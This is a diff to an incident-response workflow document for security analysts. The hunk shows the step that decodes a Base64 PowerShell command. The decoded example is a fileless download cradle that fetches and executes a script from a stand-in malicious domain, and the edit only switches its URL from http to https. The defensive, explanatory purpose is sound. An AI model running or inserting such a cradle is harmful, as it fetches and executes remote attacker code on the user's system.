@@ -17,7 +17,7 @@ This document outlines a conceptual workflow for an analyst responding to a high
 **2. Decode the Command:**
    - Copy the Base64 string from the command line.
    - Use a tool (like CyberChef or `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('...'))` in PowerShell) to decode it.
-   - **Decoded Command:** `IEX (New-Object Net.WebClient).DownloadString('http://evil-domain.com/payload.ps1')`
+   - **Decoded Command:** `IEX (New-Object Net.WebClient).DownloadString('https://evil-domain.com/payload.ps1')`
    - **Analysis:** The command downloads and executes a script from a remote, suspicious domain. This is an "in-memory" or "fileless" attack vector.
 
 **3. Check Endpoint Vitals (in EDR console):**
